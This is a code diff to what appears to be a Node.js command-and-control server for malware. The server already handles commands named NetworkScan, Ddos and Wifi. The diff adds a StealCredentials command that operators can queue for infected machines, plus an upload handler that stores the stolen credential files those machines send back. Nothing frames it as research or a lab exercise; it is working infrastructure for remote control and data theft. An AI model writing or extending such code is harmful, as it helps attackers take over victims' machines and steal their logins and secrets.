@@ -25,6 +25,7 @@ const {
   NetworkScan,
   Ddos,
   Wifi,
+  StealCredentials,
 } = require("./commands");
 const { join } = require("path");
 
@@ -54,15 +55,24 @@ const storage = multer.diskStorage({
         uploadType: "audio",
       });
       cb(null, filename);
-    } else if (req.body.uploadType === "screen") {
-      const filename = "screen-" + Date.now() + "-" + file.originalname;
+    } else if (req.body.uploadType === "credential") {
+      const filename = "credential-" + Date.now() + "-" + file.originalname;
       currentChannel.messages.push({
         from: "c2",
         message: "File received",
         upload: filename,
-        uploadType: "screen",
+        uploadType: "credential",
       });
       cb(null, filename);
+    } else if (req.body.uploadType === "screen") {
+        const filename = "screen-" + Date.now() + "-" + file.originalname;
+        currentChannel.messages.push({
+          from: "c2",
+          message: "File received",
+          upload: filename,
+          uploadType: "screen",
+        });
+        cb(null, filename);
     } else {
       const filename = "file-" + Date.now() + "-" + file.originalname;
       currentChannel.messages.push({
@@ -246,6 +256,11 @@ function sendCommand(command) {
       const installIpScannerCommand = new InstallIpScanner();
       targetChannel.commands.push(installIpScannerCommand);
       break;
+    case "StealCredentials" :
+      logger.info("Adding StealCredentials command");
+      const stealCommand = new StealCredentials();
+      targetChannel.commands.push(stealCommand);
+      break;
   }
 }
 
@@ -339,6 +354,7 @@ app.post("/", upload.single("file"), (req, res) => {
   logger.info("receiving a POST request from : " + req.ip);
   logger.info("request body : " + JSON.stringify(req.body));
 
+
   const payload = req.body;
 
   if (req.body.uploadType) {
@@ -366,6 +382,8 @@ app.post("/", upload.single("file"), (req, res) => {
     addChannelMessage(payload.id, payload.result);
   } else {
     logger.warn("unknown request");
+    logger.warn(JSON.stringify(payload));
+    logger.warn(req.json())
   }
 
   res.send("OK");
